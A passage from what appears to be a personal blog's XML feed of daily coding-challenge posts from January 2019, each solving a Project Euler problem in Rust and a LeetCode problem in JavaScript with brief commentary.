&#123; return a-b &gt;1e-6; &#125;; if(cmp(dis(p1,p2), dis(p1,p3))) [p2, p4] = [p4, p2]; else if(cmp(dis(p1,p3), dis(p1, p2))) [p3, p4] = [p4, p3]; return !cmp(dis(p1,p2),dis(p1,p3)) &amp;&amp; !cmp(dis(p1,p3),dis(p1,p2)) &amp;&amp; cmp(dis(p1,p2),0)&amp;&amp; (Math.abs(p1[0]-p2[0]) === Math.abs(p3[0]-p4[0])) &amp;&amp; (Math.abs(p1[1]-p2[1]) === Math.abs(p3[1]-p4[1])) &amp;&amp; (Math.abs(p1[0]-p3[0]) === Math.abs(p2[0]-p4[0])) &amp;&amp; (Math.abs(p1[1]-p3[1]) === Math.abs(p2[1]-p4[1])) &amp;&amp; ((p1[0]-p2[0])*(p1[0]-p3[0])+(p1[1]-p3[1])*(p1[1]-p2[1]) === 0);&#125;;// console.log(validSquare(p1 = [0,0], p2 = [1,1], p3 = [1,0], p4 = [0,1]));// console.log(validSquare([0,0], [5,0], [5,4], [0,4]));]]></content>
      <categories>
        <category>DailyChallenge</category>
      </categories>
      <tags>
        <tag>Math</tag>
        <tag>Algorithm</tag>
        <tag>LeetCode</tag>
        <tag>ProjectEuler</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019-01-18 Daily Challenge]]></title>
    <url>%2F2019-01-18-Daily-Challenge%2F</url>
    <content type="text"><![CDATA[What I&#39;ve done today is Distinct powers in Oral CalculationRust and To Lower Case in JavaScript. MathProblemDistinct powersProblem 29Consider all integer combinations of $a^b$ for 2 ≤ a ≤ 5 and 2 ≤ b ≤ 5: $$2^2=4,2^3=8,2^4=16,2^5=32$$ $$3^2=9,3^3=27,3^4=81,3^5=243$$ $$2^2=4,2^3=8,2^4=16,2^5=32$$ $$2^2=4,2^3=8,2^4=16,2^5=32$$ If they are then placed in ppowewernumerical order, with any repeats removed, we get the following sequence of 15 distinct terms: 4, 8, 9, 16, 25, 27, 32, 64, 81, 125, 243, 256, 625, 1024, 3125 How many distinct terms are in the sequence generated by $a^b$ for 2 ≤ a ≤ 100 and 2 ≤ b ≤ 100? SolutionI&#39;ll do it with inclusion-exclusion principle. Powers of two which under 101 are 4, 8, 16, 32, 64. Powers of three which under 101 are 9, 27, 81. Powers of four which under 101 are 16, 64. Powers of five which under 101 is 25. Powers of six which under 101 is 36. Powers of seven which under 101 is 49. Powers of eight which under 101 is 64. Powers of nine which under 101 is 81. Powers of ten which under 101 is 100. Answer is $$|powers\ of\ 2|+|powers\ of\ 3|+...+|powers\ of\ 100|-$$ $$|powers\ of\ 2\ and\ 4|-..-|powers\ of\ 10\ and\ 100|+$$ $$|powers\ of\ 2,4,16|+|powers\ of\ 3,9,81|-|powers\ of\ 2,4,8,64|$$ And I come up with this draft on plane And yes! Get the wrong answer XD I check my thoughts and found I miss a lot of thing. So I decide to do it with brute force :p Code to check my id: 123456s = set()for i in range(2, 101): l = len(s) for j in range(2, 101): s.add(i**j) print(i,len(s)-l) Result: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798992 99 3 99 4 50 5 99 6 99 7 99 8 50 9 50 10 99 11 99 12 99 13 99 14 99 15 99 16 41 17 99 18 99 19 99 20 99 21 99 22 99 23 99 24 99 25 50 26 99 27 50 28 99 29 99 30 99 31 99 32 51 33 99 34 99 35 99 36 50 37 99 38 99 39 99 40 99 41 99 42 99 43 99 44 99 45 99 46 99 47 99 48 99 49 50 50 99 51 99 52 99 53 99 54 99 55 99 56 99 57 99 58 99 59 99 60 99 61 99 62 99 63 99 64 37 65 99 66 99 67 99 68 99 69 99 70 99 71 99 72 99 73 99 74 99 75 99 76 99 77 99 78 99 79 99 80 99 81 41 82 99 83 99 84 99 85 99 86 99 87 99 88 99 89 99 90 99 91 99 92 99 93 99 94 99 95 99 96 99 97 99 98 99 99 99 100 50 Implementation1234567891011121314151617extern crate num_bigint;extern crate num_traits;use num_bigint::BigInt;use num_traits::pow;use std::collections::HashSet;fn main() &#123; let mut set = HashSet::new(); for i in 2..101 &#123; for j in 2..101 &#123; let base = BigInt::from(i); set.insert(pow(base,j)); &#125; &#125; println!("Answer is &#123;&#125;", set.len());&#125; AlgorithmProblem709. To Lower CaseImplement function ToLowerCase() that has a string parameter str, and returns the same string in lowercase. Example 1: 12Input: &quot;Hello&quot;Output: &quot;hello&quot; Example 2: 12Input: &quot;here&quot;Output: &quot;here&quot; Example 3: 12Input: &quot;LOVELY&quot;Output: &quot;lovely&quot; SolutionNothing to say. Implementation1234567/** * @param &#123;string&#125; str * @return &#123;string&#125; */var toLowerCase = function(str) &#123; return str.toLowerCase();&#125;;]]></content>
      <categories>
        <category>DailyChallenge</category>
      </categories>
      <tags>
        <tag>Math</tag>
        <tag>Algorithm</tag>
        <tag>LeetCode</tag>
        <tag>ProjectEuler</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019-01-17 Daily Challenge]]></title>
    <url>%2F2019-01-17-Daily-Challenge%2F</url>
    <content type="text"><![CDATA[What I&#39;ve done today is Number spiral diagonals in Rust and Add Binary in JavaScript. BTW, I decided to the change style of problem section~ MathProblemNumber spiral diagonalsProblem 28Starting with the number 1 and moving to the right in a clockwise direction a 5 by 5 spiral is formed as follows: 21 22 23 24 2520 7 8 9 1019 6 1 2 1118 5 4 3 1217 16 15 14 13 It can be verified that the sum of the numbers on the diagonals is 101. What is the sum of the numbers on the diagonals in a 1001 by 1001 spiral formed in the same way? SolutionWhen you check the sequence 1, 3, 5, 7, 9, 13, 17, 21, 25, you will find that the numbers of sequence except the first one, others can be grouped by each four number. Implementation1234567891011fn main() &#123; let mut ans: i64 = 1; let mut tmp: i64 = 1; for i in 1i64..501i64 &#123; for _j in 0..4 &#123; tmp += i*2; ans += tmp; &#125; &#125; println!("Answer is &#123;&#125;", ans);&#125; AlgorithmProblem67. Add BinaryGiven two binary strings, return their sum (also a binary string). The input strings are both non-empty and contains only characters 1 or 0. Example 1: 12Input: a = &quot;11&quot;, b = &quot;1&quot;Output: &quot;100&quot; Example 2: 12Input: a = &quot;1010&quot;, b = &quot;1011&quot;Output: &quot;10101&quot; SolutionBecause of large input, naive implementation will fail. ImplementationFailed implementation: 12345678/** * @param &#123;string&#125; a * @param &#123;string&#125; b * @return &#123;string&#125; */var addBinary = function(a, b) &#123; return (parseInt(a,2)+parseInt(b,2)).toString(2);&#125;; Successful submission: 12345678/** * @param &#123;string&#125; a * @param &#123;string&#125; b * @return &#123;string&#125; */var addBinary = function(a, b) &#123; return (BigInt("0b"+a)+BigInt("0b"+b)).toString(2);&#125;; If I want to be more efficient, I should write a function do string binary add.]]></content>
      <categories>
        <category>DailyChallenge</category>
      </categories>
      <tags>
        <tag>Math</tag>
        <tag>Algorithm</tag>
        <tag>LeetCode</tag>
        <tag>ProjectEuler</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019-01-16 Daily Challenge]]></title>
    <url>%2F2019-01-16-Daily-Challenge%2F</url>
    <content type="text"><![CDATA[What I&#39;ve done today is Quadratic primes in Rust and Longest Absolute File Path in JavaScript. MathProblem123456789101112131415161718Quadratic primesProblem 27 Euler discovered the remarkable quadratic formula:n……2+n+41It turns out that the formula will produce 40 primes for the consecutive integer values 0≤n≤39. However, when n=40,40^2+40+41=40(40+1)+41 is divisible by 41, and certainly when n=41,41^2+41+41 is clearly divisible by 41.The incredible formula n^2−79n+1601 was discovered, which produces 80 primes for the consecutive values 0≤n≤79. The product of the coefficients, −79 and 1601, is −126479.Considering quadratics of the form:n^2+an+b, where |a|&lt;1000 and |b|≤1000where |n| is the modulus/absolute value of ne.g. |11|=11 and |−4|=4Find the product of the coefficients, a and b, for the quadratic expression that produces the maximum number of primes for consecutive values of n, starting with n=0. SolutionBecause n start from zero, so b must be a prime. Because maximum number of primes for consecutive values must be greater than one, so when n equals one, the expression will be a prime, which means $1 + a + b$ is prime, when $b$ equals two, $a$ must be even, otherwise $a$ must be odd. But I don&#39;t want to do it. Implementation1234567891011121314151617181920212223242526272829303132extern crate primal;use primal::Sieve;fn main() &#123; let sieve = Sieve::new(2_000_000); let mut ansa = 0; let mut ansb = 0; let mut ansc = 0; let count = sieve.prime_pi(1000) + 1usize; for i in -999i32..1000 &#123; for j in 1..count &#123; let mut tmpc = 1; loop &#123; let tmp = tmpc * tmpc + i * tmpc + (sieve.nth_prime(j) as i32); if tmp &lt; 0 &#123; break; &#125; if !sieve.is_prime(tmp as usize) &#123; break; &#125; tmpc += 1; &#125; if tmpc &gt; ansc &#123; ansa = i; ansb = sieve.nth_prime(j); ansc = tmpc; &#125; &#125; &#125; println!("Answer is &#123;&#125;, &#123;&#125;, &#123;&#125;", ansa, ansb, ansc);&#125; Alogorithm12345678910111213141516171819202122232425262728293031323334388. Longest Absolute File PathSuppose we abstract our file system by a string in the following manner:The string &quot;dir\n\tsubdir1\n\tsubdir2\n\t\tfile.ext&quot; represents:dir subdir1 subdir2 file.extThe directory dir contains an empty sub-directory subdir1 and a sub-directory subdir2 containing a file file.ext.The string &quot;dir\n\tsubdir1\n\t\tfile1.ext\n\t\tsubsubdir1\n\tsubdir2\n\t\tsubsubdir2\n\t\t\tfile2.ext&quot; represents:dir subdir1 file1.ext subsubdir1 subdir2 subsubdir2 file2.extThe directory dir contains two sub-directories subdir1 and subdir2. subdir1 contains a file file1.ext and an empty second-level sub-directory subsubdir1. subdir2 contains a second-level sub-directory subsubdir2 containing a file file2.ext.We are interested in finding the longest (number of characters) absolute path to a file within our file system. For example, in the second example above, the longest absolute path is &quot;dir/subdir2/subsubdir2/file2.ext&quot;, and its length is 32 (not including the double quotes).Given a string representing the file system in the above format, return the length of the longest absolute path to file in the abstracted file system. If there is no file in the system, return 0.Note:The name of a file contains at least a . and an extension.The name of a directory or sub-directory will not contain a ..Time complexity required: O(n) where n is the size of the input string.Notice that a/aa/aaa/file1.txt is not the longest file path, if there is another path aaaaaaaaaaaaaaaaaaaaa/sth.png. SolutionThis problem looks like real world problem happens on Windows. Solution is quite clear so I don&#39;t want to explain it. The point is that when you come cross one file, you can know its ancestor directories&#39;s length. Implementation123456789101112131415161718192021222324252627/** * @param &#123;string&#125; input * @return &#123;number&#125; */var lengthLongestPath = function(input) &#123; let sumArr = []; let ans = 0; const countTab = (str) =&gt; &#123; for(let i = 0; i &lt; str.length; ++i)&#123; if(str[i] !== "\t") return i; &#125; &#125;; for(const str of input.split('\n')) &#123; if(str.includes("."))&#123; let pos = countTab(str); ans = Math.max(ans, pos?str.length - pos + sumArr[pos - 1]:str.length); &#125;else&#123; let pos = countTab(str); sumArr[pos] = pos?sumArr[pos - 1] + str.length - pos + 1:str.length+1; &#125; &#125; return ans;&#125;;// console.log(lengthLongestPath("dir\n\tsubdir1\n\tsubdir2\n\t\tfile.ext"));// console.log(lengthLongestPath("dir\n\tsubdir1\n\t\tfile1.ext\n\t\tsubsubdir1\n\tsubdir2\n\t\tsubsubdir2\n\t\t\tfile2.ext"));// console.log(lengthLongestPath("asdf.asdf"));]]></content>
      <categories>
        <category>DailyChallenge</category>
      </categories>
      <tags>
        <tag>Math</tag>
        <tag>Algorithm</tag>
        <tag>LeetCode</tag>
        <tag>ProjectEuler</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019-01-15 Daily Challenge]]></title>
    <url>%2F2019-01-15-Daily-Challenge%2F</url>
    <content type="text"><![CDATA[What I&#39;ve done today is Reciprocal cycles in Rust and Open the Lock in JavaScript. MathProblem123456789101112131415161718Reciprocal cyclesProblem 26 A unit fraction contains 1 in the numerator. The decimal representation of the unit fractions with denominators 2 to 10 are given:1/2 = 0.51/3 = 0.(3)1/4 = 0.251/5 = 0.21/6 = 0.1(6)1/7 = 0.(142857)1/8 = 0.1251/9 = 0.(1)1/10 = 0.1Where 0.1(6) means 0.166666..., and has a 1-digit recurring cycle. It can be seen that 1/7 has a 6-digit recurring cycle.Find the value of d &lt; 1000 for which 1/d contains the longest recurring cycle in its decimal fraction part. SolutionI use a very simple way to simulate it, check the code for more detail. Implementation123456789101112131415161718192021222324252627282930313233use std::collections::HashMap;fn main() &#123; let mut map = HashMap::new(); let mut ans = 0; let mut ansi = 7; for i in 1..1000 &#123; map.clear(); let mut res = 1; let mut cnt = 0; loop &#123; // println!("&#123;&#125;, &#123;&#125;, &#123;&#125;",res, i, res % i); res = res % i; if res == 0 &#123; // println!("WTF"); break; &#125; if map.contains_key(&amp;res) &#123; let tmp: i32 = cnt - *map.get(&amp;res).unwrap(); // println!("&#123;&#125;, &#123;&#125;, &#123;&#125;",res,i,tmp); if tmp &gt; ans &#123; ans = tmp; ansi = i; &#125; break; &#125; map.insert(res, cnt); res *= 10; cnt += 1; &#125; &#125; println!("Answer is &#123;&#125;, recurring cycle is &#123;&#125;-digit.", ansi, ans);&#125; Algorithm12345678910111213141516171819202122232425262728293031323334752. Open the LockYou have a lock in front of you with 4 circular wheels. Each wheel has 10 slots: &apos;0&apos;, &apos;1&apos;, &apos;2&apos;, &apos;3&apos;, &apos;4&apos;, &apos;5&apos;, &apos;6&apos;, &apos;7&apos;, &apos;8&apos;, &apos;9&apos;. The wheels can rotate freely and wrap around: for example we can turn &apos;9&apos; to be &apos;0&apos;, or &apos;0&apos; to be &apos;9&apos;. Each move consists of turning one wheel one slot.The lock initially starts at &apos;0000&apos;, a string representing the state of the 4 wheels.You are given a list of deadends dead ends, meaning if the lock displays any of these codes, the wheels of the lock will stop turning and you will be unable to open it.Given a target representing the value of the wheels that will unlock the lock, return the minimum total number of turns required to open the lock, or -1 if it is impossible.Example 1:Input: deadends = [&quot;0201&quot;,&quot;0101&quot;,&quot;0102&quot;,&quot;1212&quot;,&quot;2002&quot;], target = &quot;0202&quot;Output: 6Explanation:A sequence of valid moves would be &quot;0000&quot; -&gt; &quot;1000&quot; -&gt; &quot;1100&quot; -&gt; &quot;1200&quot; -&gt; &quot;1201&quot; -&gt; &quot;1202&quot; -&gt; &quot;0202&quot;.Note that a sequence like &quot;0000&quot; -&gt; &quot;0001&quot; -&gt; &quot;0002&quot; -&gt; &quot;0102&quot; -&gt; &quot;0202&quot; would be invalid,because the wheels of the lock become stuck after the display becomes the dead end &quot;0102&quot;.Example 2:Input: deadends = [&quot;8888&quot;], target = &quot;0009&quot;Output: 1Explanation:We can turn the last wheel in reverse to move from &quot;0000&quot; -&gt; &quot;0009&quot;.Example 3:Input: deadends = [&quot;8887&quot;,&quot;8889&quot;,&quot;8878&quot;,&quot;8898&quot;,&quot;8788&quot;,&quot;8988&quot;,&quot;7888&quot;,&quot;9888&quot;], target = &quot;8888&quot;Output: -1Explanation:We can&apos;t reach the target without getting stuck.Example 4:Input: deadends = [&quot;0000&quot;], target = &quot;8888&quot;Output: -1Note:The length of deadends will be in the range [1, 500].target will not be in the list deadends.Every string in deadends and the string target will be a string of 4 digits from the 10,000 possibilities &apos;0000&apos; to &apos;9999&apos;. SolutionBFS is capable for it, but better way is two-end bfs. By the way, this code is just like shit, I&#39;m going rewrite it later! Done! Implementation123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263/** * @param &#123;string[]&#125; deadends * @param &#123;string&#125; target * @return &#123;number&#125; */var openLock = function(deadends, target)&#123; if(deadends.includes(target) || deadends.includes("0000")) return -1; let set = new Set(); let srcMap = new Map(); for (const s of deadends)&#123; set.add(s); &#125; let srcQueue = []; let tmp; srcQueue.push(["0000",0]); srcMap.set("0000",0); while(srcQueue.length)&#123; // console.log(srcQueue,dstQueue); let cur = srcQueue.shift(); if(cur[0]==target) return cur[1]; tmp = (+cur[0][0] + 1)%10 + cur[0].slice(1); if(!set.has(tmp) &amp;&amp; !srcMap.has(tmp))&#123; srcMap.set(tmp, cur[1] + 1); srcQueue.push([tmp, cur[1] + 1]); &#125; tmp = cur[0][0] + (+cur[0][1] + 1)%10 +cur[0].slice(2); if(!set.has(tmp) &amp;&amp; !srcMap.has(tmp))&#123; srcMap.set(tmp, cur[1] + 1); srcQueue.push([tmp, cur[1] + 1]); &#125; tmp = cur[0].slice(0, 2) + (+cur[0][2] + 1)%10 + cur[0][3]; if(!set.has(tmp) &amp;&amp; !srcMap.has(tmp))&#123; srcMap.set(tmp, cur[1] + 1); srcQueue.push([tmp, cur[1] + 1]); &#125; tmp = cur[0].slice(0, 3) + (+cur[0][3] + 1)%10; if(!set.has(tmp) &amp;&amp; !srcMap.has(tmp))&#123; srcMap.set(tmp, cur[1] + 1); srcQueue.push([tmp, cur[1] + 1]); &#125; tmp = (+cur[0][0] -1 + 10)%10 + cur[0].slice(1); if(!set.has(tmp) &amp;&amp; !srcMap.has(tmp))&#123; srcMap.set(tmp, cur[1] + 1); srcQueue.push([tmp, cur[1] + 1]); &#125; tmp = cur[0][0] + (+cur[0][1] -1 + 10)%10 +cur[0].slice(2); if(!set.has(tmp) &amp;&amp; !srcMap.has(tmp))&#123; srcMap.set(tmp, cur[1] + 1); srcQueue.push([tmp, cur[1] + 1]); &#125; tmp = cur[0].slice(0, 2) + (+cur[0][2] -1 + 10)%10 + cur[0][3]; if(!set.has(tmp) &amp;&amp; !srcMap.has(tmp))&#123; srcMap.set(tmp, cur[1] + 1); srcQueue.push([tmp, cur[1] + 1]); &#125; tmp = cur[0].slice(0, 3) + (+cur[0][3] -1 + 10)%10; if(!set.has(tmp) &amp;&amp; !srcMap.has(tmp))&#123; srcMap.set(tmp, cur[1] + 1); srcQueue.push([tmp, cur[1] + 1]); &#125; &#125; return -1;&#125;; Rewrite it! 1234567891011121314151617181920212223242526272829303132333435363738394041424344/** * @param &#123;string[]&#125; deadends * @param &#123;string&#125; target * @return &#123;number&#125; */var openLock = function(deadends, target)&#123; if(deadends.includes(target) || deadends.includes("0000")) return -1; let set = new Set(); let srcMap = new Map(); for (const s of deadends)&#123; set.add(s); &#125; let srcQueue = []; srcQueue.push(["0000",0]); srcMap.set("0000",0); let check = (cur, i) =&gt; &#123; // console.log(set); let tmp = cur[0].slice(0,i) + (+cur[0][i] + 1)%10 + cur[0].slice(i+1); // console.log(tmp); if(!set.has(tmp) &amp;&amp; !srcMap.has(tmp))&#123; srcMap.set(tmp, cur[1] + 1); srcQueue.push([tmp, cur[1] + 1]); &#125; tmp = cur[0].slice(0,i) + (+cur[0][i] -1 + 10)%10 + cur[0].slice(i+1); // console.log(tmp); if(!set.has(tmp) &amp;&amp; !srcMap.has(tmp))&#123; srcMap.set(tmp, cur[1] + 1); srcQueue.push([tmp, cur[1] + 1]); &#125; &#125;; while(srcQueue.length)&#123; // console.log(srcQueue); let cur = srcQueue.shift(); if(cur[0] === target) return cur[1]; for(let i = 0; i &lt; 4; ++i)&#123; check(cur, i); &#125; &#125; return -1;&#125;;// console.log(openLock(["0201","0101","0102","1212","2002"],"0202"));// console.log(openLock(["8888"],"0009"));// console.log(openLock(["8887","8889","8878","8898","8788","8988","7888","9888"],"8888"));]]></content>
      <categories>
        <category>DailyChallenge</category>
      </categories>
      <tags>
        <tag>Math</tag>
        <tag>Algorithm</tag>
        <tag>LeetCode</tag>
        <tag>ProjectEuler</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019-01-14 Daily Challenge]]></title>
    <url>%2F2019-01-14-Daily-Challenge%2F</url>
    <content type="text"><![CDATA[What I&#39;ve done today is 1000-digit Fibonacci number in Rust and Best Time to Buy and Sell Stock IV in JavaScript. MathProblem1234567891011121314151617181920212223241000-digit Fibonacci numberProblem 25 The Fibonacci sequence is defined by the recurrence relation:Fn = Fn−1 + Fn−2, where F1 = 1 and F2 = 1.Hence the first 12 terms will be:F1 = 1F2 = 1F3 = 2F4 = 3F5 = 5F6 = 8F7 = 13F8 = 21F9 = 34F10 = 55F11 = 89F12 = 144The 12th term, F12, is the first term to contain three digits.What is the index of the first term in the Fibonacci sequence to contain 1000 digits? SolutionNothing to say. Implementation123456789101112131415161718extern crate num_bigint;extern crate num_traits;use num_bigint::BigUint;use num_traits::&#123;Zero, One&#125;;use std::mem::replace;fn main() &#123; let mut f0: BigUint = Zero::zero(); let mut f1: BigUint = One::one(); let mut index = 0; while f0.to_str_radix(10).len() &lt; 1000usize &#123; let f2 = f0 + &amp;f1; f0 = replace(&amp;mut f1, f2); index += 1; &#125; println!("Answer is &#123;&#125;", index);&#125; AlgorithmProblem1234567891011121314151617181920188. Best Time to Buy and Sell Stock IVSay you have an array for which the ith element is the price of a given stock on day i.Design an algorithm to find the maximum profit. You may complete at most k transactions.Note:You may not engage in multiple transactions at the same time (ie, you must sell the stock before you buy again).Example 1:Input: [2,4,1], k = 2Output: 2Explanation: Buy on day 1 (price = 2) and sell on day 2 (price = 4), profit = 4-2 = 2.Example 2:Input: [3,2,6,5,0,3], k = 2Output: 7Explanation: Buy on day 2 (price = 2) and sell on day 3 (price = 6), profit = 6-2 = 4. Then buy on day 5 (price = 0) and sell on day 6 (price = 3), profit = 3-0 = 3. SolutionDP. But I&#39;m too tired doing school project to explain it. Leave it for later... Implementation1234567891011121314151617181920212223242526272829303132333435363738/** * @param &#123;number&#125; k * @param &#123;number[]&#125; prices * @return &#123;number&#125; */var maxProfit = function(k, prices) &#123; if(!prices.length) return 0; if(k*2 &gt;= prices.length) return maxProf(prices); let n = prices.length; let dp = new Array(n); dp.fill(0); for(let i = 0; i &lt; k; ++i) &#123; let min_paid = prices[0]; let prev = dp[0]; for(let j = 1; j &lt; n; ++j) &#123; let tmp = dp[j]; min_paid = Math.min(min_paid, prices[j] - prev); dp[j] = Math.max(dp[j-1], prices[j]-min_paid); prev = tmp; &#125; &#125; return dp[n-1];&#125;;/** * @param &#123;number[]&#125; prices * @return &#123;number&#125; */function maxProf(prices)&#123; let ans = 0; let n = prices.length; for(let i = 1; i &lt; n; ++i) &#123; if(prices[i] &gt; prices[i-1]) ans += prices[i]-prices[i-1]; &#125; return ans;&#125;// console.log(maxProfit(2,[2,1,2,0,1]));]]></content>
      <categories>
        <category>DailyChallenge</category>
      </categories>
      <tags>
        <tag>Math</tag>
        <tag>Algorithm</tag>
        <tag>LeetCode</tag>
        <tag>ProjectEuler</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019-01-13 Daily Challenge]]></title>
    <url>%2F2019-01-13-Daily-Challenge%2F</url>
    <content type="text"><![CDATA[What I&#39;ve done today is Lexicographic permutations in Rust and Unique Binary Search Trees II in JavaScript. MathProblem123456789Lexicographic permutationsProblem 24 A permutation is an ordered arrangement of objects. For example, 3124 is one possible permutation of the digits 1, 2, 3 and 4. If all of the permutations are listed numerically or alphabetically, we call it lexicographic order. The lexicographic permutations of 0, 1 and 2 are:012 021 102 120 201 210What is the millionth lexicographic permutation of the digits 0, 1, 2, 3, 4, 5, 6, 7, 8 and 9? SolutionI&#39;ve done it with javascript in 2019-01-03 Daily Challenge, so what I need to do is just translate it into Rust. Implementation123456789101112131415161718192021222324252627282930313233343536373839404142434445use std::vec::Vec;fn main() &#123; for i in nth_permutation(3, 3) &#123; println!("&#123;&#125;", i); &#125; println!(""); for i in nth_permutation(4, 9) &#123; print!("&#123;&#125;", i); &#125; println!(""); for i in nth_permutation(10, 1_000_000) &#123; print!("&#123;&#125;", i); &#125;&#125;fn nth_permutation(n: i32, mut k: i64) -&gt; Vec&lt;i32&gt; &#123; k -= 1; let mut fac: Vec&lt;i64&gt; = [1].to_vec(); let mut ans: Vec&lt;i32&gt; = Vec::new(); let mut used: Vec&lt;bool&gt; = [false].to_vec(); for i in 1i64..(n as i64) &#123; let tmp = fac[i as usize - 1]*i; fac.push(tmp); used.push(false); &#125; let mut cur = n-1; while cur &gt;= 0 &#123; let mut index = k/fac[cur as usize]; k %= fac[cur as usize]; for i in 0..used.len() &#123; if !used[i] &#123; if index &gt; 0 &#123; index -= 1; &#125;else&#123; ans.push(i as i32); used[i] = true; break; &#125; &#125; &#125; cur -= 1; &#125; return ans;&#125; AlgorithmProblem123456789101112131415161718192021222395. Unique Binary Search Trees IIGiven an integer n, generate all structurally unique BST&apos;s (binary search trees) that store values 1 ... n.Example:Input: 3Output:[ [1,null,3,2], [3,2,null,1], [3,1,null,null,2], [2,1,3], [1,null,2,null,3]]Explanation:The above output corresponds to the 5 unique BST&apos;s shown below: 1 3 3 2 1 \ / / / \ \ 3 2 1 1 3 2 / / \ \ 2 1 2 3 SolutionBecause it is BST, so when we determine one root, we will known what&#39;s on its left and what&#39;s on right. So we could do it recursively. Because recursive process will go through many repeated tree nodes(like recursive fibonacci function), so we could memorize it. Implementation123456789101112131415161718192021222324252627282930313233343536373839404142434445464748/** * Definition for a binary tree node. * function TreeNode(val) &#123; * this.val = val; * this.left = this.right = null; * &#125; *//** * @param &#123;number&#125; n * @return &#123;TreeNode[]&#125; */var generateTrees = function(n) &#123; if(n===0) return []; const map = new Map(); return generateTreess(1,n+1,map);&#125;;/** * Interval is left-closed right-opened * @param &#123;number&#125; l * @param &#123;number&#125; r * @param &#123;Map&#125; map * @return &#123;TreeNode[]&#125; */function generateTreess(l,r,map)&#123; if(l===r) return [null]; if(map.has(l)&amp;&amp;map.get(l).has(r))&#123; return map.get(l).get(r); &#125; let trees = []; for(let i = l; i &lt; r; ++i)&#123; const left = generateTreess(l,i,map); const right = generateTreess(i+1,r,map); for(let j = 0; j &lt; left.length; ++j)&#123; for(let k = 0; k &lt; right.length; ++k)&#123; const node = new TreeNode(i); node.left = left[i]; node.right = right[k]; trees.push(node); &#125; &#125; &#125; if(!map.has(l))&#123; map.set(l,new Map()); &#125; map.get(l).set(r,trees); return trees;&#125;]]></content>
      <categories>
        <category>DailyChallenge</category>
      </categories>
      <tags>
        <tag>Math</tag>
        <tag>Algorithm</tag>
        <tag>LeetCode</tag>
        <tag>ProjectEuler</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019-01-12 Daily Challenge]]></title>
    <url>%2F2019-01-12-Daily-Challenge%2F</url>
    <content type="text"><![CDATA[What I&#39;ve done today is Non-abundant sums in Rust and Word Ladder in JavaScript. MathProblem1234567891011Non-abundant sumsProblem 23 A perfect number is a number for which the sum of its proper divisors is exactly equal to the number. For example, the sum of the proper divisors of 28 would be 1 + 2 + 4 + 7 + 14 = 28, which means that 28 is a perfect number.A number n is called deficient if the sum of its proper divisors is less than n and it is called abundant if this sum exceeds n.As 12 is the smallest abundant number, 1 + 2 + 3 + 4 + 6 = 16, the smallest number that can be written as the sum of two abundant numbers is 24. By mathematical analysis, it can be shown that all integers greater than 28123 can be written as the sum of two abundant numbers. However, this upper limit cannot be reduced any further by analysis even though it is known that the greatest number that cannot be expressed as the sum of two abundant numbers is less than this limit.Find the sum of all the positive integers which cannot be written as the sum of two abundant numbers. SolutionNothing to say. Implementation12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849extern crate primal;use std::vec::Vec;use primal::Sieve;fn main() &#123; const SIZE: usize = 28124; let mut arr: [bool; SIZE] = [false; SIZE]; let sieve = Sieve::new(10000); let mut abundants :Vec&lt;i32&gt; = Vec::new(); let mut ans: i64 = 0; for i in 1..28123 &#123; if sum_of_divisor(i, &amp;sieve) &gt; i &#123; abundants.push(i); &#125; &#125; for i in 0..(abundants.len()) &#123; for j in i..(abundants.len())&#123; if ((abundants[i] + abundants[j]) as usize) &lt; SIZE &#123; arr[(abundants[i] + abundants[j]) as usize] = true; &#125; &#125; &#125; assert!(arr[24]); for i in 0..SIZE &#123; if !arr[i] &#123; ans += i as i64; &#125; &#125; println!("Answer is &#123;&#125;", ans);&#125;fn sum_of_divisor(n: i32, sieve: &amp;Sieve) -&gt; i32 &#123; let factors: Vec&lt;(usize, usize)&gt; = match sieve.factor(n as usize) &#123; Ok(v) =&gt; v, Err(_) =&gt; Vec::new(), &#125;; let mut ans = 1; for factor in factors &#123; let mut tmp = 1; let mut sum = 1; for _ in 0..factor.1 &#123; tmp *= factor.0; sum += tmp; &#125; ans *= sum; &#125; ans as i32 - n&#125; AlgorithmProblem12345678910111213141516171819202122232425262728293031323334127. Word LadderGiven two words (beginWord and endWord), and a dictionary&apos;s word list, find the length of shortest transformation sequence from beginWord to endWord, such that:Only one letter can be changed at a time.Each transformed word must exist in the word list. Note that beginWord is not a transformed word.Note:Return 0 if there is no such transformation sequence.All words have the same length.All words contain only lowercase alphabetic characters.You may assume no duplicates in the word list.You may assume beginWord and endWord are non-empty and are not the same.Example 1:Input:beginWord = &quot;hit&quot;,endWord = &quot;cog&quot;,wordList = [&quot;hot&quot;,&quot;dot&quot;,&quot;dog&quot;,&quot;lot&quot;,&quot;log&quot;,&quot;cog&quot;]Output: 5Explanation: As one shortest transformation is &quot;hit&quot; -&gt; &quot;hot&quot; -&gt; &quot;dot&quot; -&gt; &quot;dog&quot; -&gt; &quot;cog&quot;,return its length 5.Example 2:Input:beginWord = &quot;hit&quot;endWord = &quot;cog&quot;wordList = [&quot;hot&quot;,&quot;dot&quot;,&quot;dog&quot;,&quot;lot&quot;,&quot;log&quot;]Output: 0Explanation: The endWord &quot;cog&quot; is not in wordList, therefore no possible transformation. SolutionOf course BFS can handle this, but I want to implement dijkstra in js. So I really have done a shitty job..... :X Implementation12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364/** * @param &#123;string&#125; beginWord * @param &#123;string&#125; endWord * @param &#123;string[]&#125; wordList * @return &#123;number&#125; */var ladderLength = function(beginWord, endWord, wordList) &#123; let map = new Map(); if(wordList.indexOf(beginWord)==-1) wordList.unshift(beginWord); let G = new Array(wordList.length); for(let i=0; i&lt;wordList.length; ++i)&#123; map.set(wordList[i], i); G[i] = new Array(wordList.length).fill(1e10); &#125; // console.log(map); let OK = (str1, str2) =&gt; &#123; let cnt = 0; for(let i=0; i&lt;str1.length; ++i)&#123; if(str1.charAt(i) !== str2.charAt(i)) ++cnt; &#125; return cnt===1; &#125;; 